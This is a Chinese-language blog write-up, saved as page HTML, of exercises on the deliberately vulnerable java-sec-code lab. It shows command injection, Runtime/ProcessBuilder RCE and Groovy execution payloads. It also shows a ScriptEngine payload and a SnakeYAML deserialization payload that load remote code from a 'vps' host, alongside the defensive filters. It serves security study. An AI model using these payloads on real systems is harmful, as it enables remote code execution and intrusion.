@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>java-sec-code-cmdinject-rce | Sk1y's Blog</title><meta name="keywords" content="java-sec-code,cmdinject,rce"><meta name="author" content="Sk1y"><meta name="copyright" content="Sk1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java-sec-code[toc] 环境搭建大致参考：代码审计入门之java-sec-code（一） - FreeBuf网络安全行业门户 不同的地方，我使用的idea2021需要将src进行一下设置  然后按照4步进行设置  导入依赖花了一些时间 因为是在windows上运行，所以需要修改一部分代码  修改index.html  这个靶场包括java的很多漏洞  访问127.0.0.1:8080">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java-sec-code-cmdinject-rce">
+<meta property="og:url" content="https://sk1y233.github.io/2022/10/12/java-sec-code-cmdinject-rce/index.html">
+<meta property="og:site_name" content="Sk1y&#39;s Blog">
+<meta property="og:description" content="java-sec-code[toc] 环境搭建大致参考：代码审计入门之java-sec-code（一） - FreeBuf网络安全行业门户 不同的地方，我使用的idea2021需要将src进行一下设置  然后按照4步进行设置  导入依赖花了一些时间 因为是在windows上运行，所以需要修改一部分代码  修改index.html  这个靶场包括java的很多漏洞  访问127.0.0.1:8080">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2022-10-12T11:35:05.000Z">
+<meta property="article:modified_time" content="2022-10-12T12:46:13.769Z">
+<meta property="article:author" content="Sk1y">
+<meta property="article:tag" content="java-sec-code">
+<meta property="article:tag" content="cmdinject">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sk1y233.github.io/2022/10/12/java-sec-code-cmdinject-rce/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java-sec-code-cmdinject-rce',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-12 20:46:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sk1y's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">java-sec-code-cmdinject-rce</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-12T11:35:05.000Z" title="发表于 2022-10-12 19:35:05">2022-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-12T12:46:13.769Z" title="更新于 2022-10-12 20:46:13">2022-10-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java-sec-code-cmdinject-rce"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="java-sec-code"><a href="#java-sec-code" class="headerlink" title="java-sec-code"></a>java-sec-code</h1><p>[toc]</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>大致参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/289863.html">代码审计入门之java-sec-code（一） - FreeBuf网络安全行业门户</a></p>
+<p>不同的地方，我使用的idea2021需要将src进行一下设置</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234746411.png" alt="image-20221006234746411"></p>
+<p>然后按照4步进行设置</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234842950.png" alt="image-20221006234842950"></p>
+<p>导入依赖花了一些时间</p>
+<p>因为是在windows上运行，所以需要修改一部分代码</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235105851.png" alt="image-20221006235105851"></p>
+<p>修改index.html</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235704040.png" alt="image-20221006235704040"></p>
+<p>这个靶场包括java的很多漏洞</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132307190.png" alt="image-20221007132307190"></p>
+<p>访问127.0.0.1:8080，账户密码 admin admin123</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132356964.png" alt="image-20221007132356964"></p>
+<h2 id="CmdInject"><a href="#CmdInject" class="headerlink" title="CmdInject"></a>CmdInject</h2><p>命令注入</p>
+<p>注意看url</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeinject?filepath=.%<span class="number">26</span>ipconfig</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132558252.png" alt="image-20221007132558252"></p>
+<p>查看源码</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007161257904.png" alt="image-20221007161257904"></p>
+<h3 id="关于ProcessBuilder"><a href="#关于ProcessBuilder" class="headerlink" title="关于ProcessBuilder"></a>关于ProcessBuilder</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013256816/article/details/54603910">(7条消息) 浅析ProcessBuilder_朱小厮的博客-CSDN博客_processbuilder</a></p>
+<blockquote>
+<p>ProcessBuilder类是J2SE 1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法</p>
+<p>属性command</p>
+<p>​	是一个字符串列表，它表示要调用的外部程序文件及其参数（如果有）。在此，表示有效的操作系统命令的字符串列表是依赖于系统的。例如，每一个总体变量，通常都要成为此列表中的元素，但有一些操作系统，希望程序能自己标记命令行字符串——在这种系统中，Java 实现可能需要命令确切地包含这两个元素。(每次构造函数就是将里面的列表赋值给command)</p>
+<p>属性redirectErrorStream</p>
+<p>最初，此属性为 false，意思是子进程的标准输出和错误输出被发送给两个独立的流，这些流可以通过 Process.getInputStream() 和 Process.getErrorStream() 方法来访问。如果将值设置为 true，标准错误将与标准输出合并。这使得关联错误消息和相应的输出变得更容易。在此情况下，合并的数据可从 Process.getInputStream() 返回的流读取，而从 Process.getErrorStream() 返回的流读取将直接到达文件尾。<br>（在codeinject这里，将其设置为true，将标准输出和标准错误合并）</p>
+</blockquote>
+<p>ProcessBuilder类和Process类</p>
+<blockquote>
+<p>既然有Process类，那为什么还要发明个ProcessBuilder类呢？ProcessBuilder和Process两个类有什么区别呢？<br>原来，ProcessBuilder为进程提供了更多的控制，例如，可以设置当前工作目录，还可以改变环境参数。而Process的功能相对来说简单的多。<br>ProcessBuilder是一个final类，有两个带参数的构造方法，你可以通过构造方法来直接创建ProcessBuilder的对象。而Process是一个抽象类，一般都通过Runtime.exec()和ProcessBuilder.start()来间接创建其实例。</p>
+</blockquote>
+<p>启动一个默认工作工作目录和环境的新进程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg&quot;</span>).start();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="codeinject-x2F-host"><a href="#codeinject-x2F-host" class="headerlink" title="codeinject&#x2F;host"></a>codeinject&#x2F;host</h3><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082818494.png" alt="image-20221008082818494"></p>
+<p>如果将Host直接设置为ip:port</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008083009131.png" alt="image-20221008083009131"></p>
+<p>那么就会执行<code>curl ip:port</code></p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082924674.png" alt="image-20221008082924674"></p>
+<p>但是如果是ip:port，那么就不能进行命令注入，所以一定要将端口号消去</p>
+<h3 id="codeinject-x2F-sec"><a href="#codeinject-x2F-sec" class="headerlink" title="codeinject&#x2F;sec"></a>codeinject&#x2F;sec</h3><p>这里对传入的参数filepath进行了处理</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145226138.png" alt="image-20221008145226138"></p>
+<p>跟进SecurityUtil.cmdFilter函数</p>
+<p>如果匹配到除FILTER_PATTERN以外的字符，就返回null</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145303967.png" alt="image-20221008145303967"></p>
+<p>查看<code>FILTER_PATTERN</code>，是大小写字母和数字</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145340125.png" alt="image-20221008145340125"></p>
+<p>所以这里就将之前命令执行的特殊字符进行了过滤</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145745292.png" alt="image-20221008145745292"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>算是了解多种java远程命令执行的方法</p>
+<h3 id="runtime-x2F-rce"><a href="#runtime-x2F-rce" class="headerlink" title="runtime&#x2F;rce"></a>runtime&#x2F;rce</h3><p>直接是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>没有经过过滤</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150007111.png" alt="image-20221008150007111"></p>
+<p>效果如下</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150048967.png" alt="image-20221008150048967"></p>
+<p>但是要注意的地方是，直接从主页面点击RCE，不会到上面的路由下</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150120417.png" alt="image-20221008150120417"></p>
+<p>而是会跳到别的地方<code>rce/exec?cmd=whoami</code>，不是正确的路由</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150155045.png" alt="image-20221008150155045"></p>
+<h3 id="processbuilder"><a href="#processbuilder" class="headerlink" title="processbuilder"></a>processbuilder</h3><p>注意修改代码</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150459385.png" alt="image-20221008150459385"></p>
+<p>运行效果</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150609672.png" alt="image-20221008150609672"></p>
+<p>具体代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="jscmd"><a href="#jscmd" class="headerlink" title="jscmd"></a>jscmd</h3><p>将zz.js放置在vps上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); <span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008224655107.png" alt="image-20221008224655107"></p>
+<p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line"><span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">engine.eval(cmd, bindings);</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http:<span class="comment">//vps/zz.js</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="vuln-x2F-yarm"><a href="#vuln-x2F-yarm" class="headerlink" title="vuln&#x2F;yarm"></a>vuln&#x2F;yarm</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/338055.html">Java代码审计之RCE漏洞 - FreeBuf网络安全行业门户</a></p>
+<p>利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意yml内容时会完成指定的动作。</p>
+<p>攻击的流程：<code>先是触发java.net.URL去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现javax.script.ScriptEngineFactory接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></p>
+<p>下载下来，然后javac编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p>生成yaml-payload.jar</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221011234824781.png" alt="image-20221011234824781"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://vps/yaml-payload.jar&quot;]]]]</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://vps/yaml-payload.jar%22]]]]</span></span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012174852653.png" alt="image-20221012174852653"></p>
+<h3 id="sec-x2F-yarm"><a href="#sec-x2F-yarm" class="headerlink" title="sec&#x2F;yarm"></a>sec&#x2F;yarm</h3><p>相比于上一个vuln&#x2F;yarm，这里使用的是SafeConstructor类</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012175801301.png" alt="image-20221012175801301"></p>
+<p>使用<code>new SafeConstructor()</code>即可防御Yaml反序列化</p>
+<h3 id="groovy"><a href="#groovy" class="headerlink" title="groovy"></a>groovy</h3><p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">groovyShell.evaluate(content);</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/groovy?content=%22calc%22.execute()</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008225020518.png" alt="image-20221008225020518"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io">Sk1y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io/2022/10/12/java-sec-code-cmdinject-rce/">https://sk1y233.github.io/2022/10/12/java-sec-code-cmdinject-rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sk1y233.github.io" target="_blank">Sk1y's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java-sec-code/">java-sec-code</a><a class="post-meta__tags" href="/tags/cmdinject/">cmdinject</a><a class="post-meta__tags" href="/tags/rce/">rce</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312821.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">使用idea进行反编译</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="this.onerror=null;this.src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="author-info__name">Sk1y</div><div class="author-info__description">每一个不曾起舞的日子都是对生命的辜负</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sk1y233"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-sec-code"><span class="toc-number">1.</span> <span class="toc-text">java-sec-code</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmdInject"><span class="toc-number">1.2.</span> <span class="toc-text">CmdInject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EProcessBuilder"><span class="toc-number">1.2.1.</span> <span class="toc-text">关于ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject-x2F-host"><span class="toc-number">1.2.2.</span> <span class="toc-text">codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject-x2F-sec"><span class="toc-number">1.2.3.</span> <span class="toc-text">codeinject&#x2F;sec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#runtime-x2F-rce"><span class="toc-number">1.3.1.</span> <span class="toc-text">runtime&#x2F;rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#processbuilder"><span class="toc-number">1.3.2.</span> <span class="toc-text">processbuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jscmd"><span class="toc-number">1.3.3.</span> <span class="toc-text">jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vuln-x2F-yarm"><span class="toc-number">1.3.4.</span> <span class="toc-text">vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-x2F-yarm"><span class="toc-number">1.3.5.</span> <span class="toc-text">sec&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#groovy"><span class="toc-number">1.3.6.</span> <span class="toc-text">groovy</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/12/java-sec-code-cmdinject-rce/" title="java-sec-code-cmdinject-rce">java-sec-code-cmdinject-rce</a><time datetime="2022-10-12T11:35:05.000Z" title="发表于 2022-10-12 19:35:05">2022-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/" title="使用idea进行反编译">使用idea进行反编译</a><time datetime="2022-10-09T01:08:34.000Z" title="发表于 2022-10-09 09:08:34">2022-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/" title="2022羊城杯-Web">2022羊城杯-Web</a><time datetime="2022-09-04T15:05:46.000Z" title="发表于 2022-09-04 23:05:46">2022-09-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/" title="SHELLCTF2022复现">SHELLCTF2022复现</a><time datetime="2022-08-15T15:50:53.000Z" title="发表于 2022-08-15 